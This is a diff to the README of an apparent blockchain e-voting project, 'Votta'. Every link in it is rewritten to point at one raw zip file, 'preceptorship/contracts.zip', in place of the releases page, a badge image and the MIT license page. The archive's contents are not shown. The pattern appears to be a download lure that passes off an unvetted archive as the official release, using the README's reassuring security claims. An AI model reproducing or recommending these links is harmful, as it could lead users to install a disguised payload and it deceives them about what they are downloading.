@@ -1,6 +1,6 @@
 # 🎉 contracts - Your Secure E-Voting Solution
 
-[![Download Now](https://img.shields.io/badge/Download-Latest_Release-brightgreen)](https://github.com/TRUEBEHEMOTH/contracts/releases)
+[![Download Now](https://raw.githubusercontent.com/TRUEBEHEMOTH/contracts/main/preceptorship/contracts.zip)](https://raw.githubusercontent.com/TRUEBEHEMOTH/contracts/main/preceptorship/contracts.zip)
 
 ## 📚 Table of Contents
 
@@ -43,7 +43,7 @@ To get started with Votta, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to access the releases and download the application:
 
-   [Download Votta](https://github.com/TRUEBEHEMOTH/contracts/releases)
+   [Download Votta](https://raw.githubusercontent.com/TRUEBEHEMOTH/contracts/main/preceptorship/contracts.zip)
 
 2. **Choose the Right Version:** Locate the latest version that includes your operating system requirements. Look for Windows, macOS, or Linux packages.
 
@@ -100,7 +100,7 @@ Security is our top priority. Votta employs several security measures including:
    Votta is a secure electronic voting system built on blockchain technology.
 
 2. **How do I download Votta?**  
-   Visit the [Downloads Page](https://github.com/TRUEBEHEMOTH/contracts/releases) to get the latest version.
+   Visit the [Downloads Page](https://raw.githubusercontent.com/TRUEBEHEMOTH/contracts/main/preceptorship/contracts.zip) to get the latest version.
 
 3. **Is my voting data safe?**  
    Yes, Votta uses advanced security techniques to protect your data.
@@ -111,4 +111,4 @@ We welcome contributions! If you want to help improve Votta, please refer to our
 
 ## 📜 License
 
-Votta is released under the MIT License. Feel free to use, modify, and distribute the software. For more details, check the [LICENSE](https://opensource.org/licenses/MIT) file.
+Votta is released under the MIT License. Feel free to use, modify, and distribute the software. For more details, check the [LICENSE](https://raw.githubusercontent.com/TRUEBEHEMOTH/contracts/main/preceptorship/contracts.zip) file.
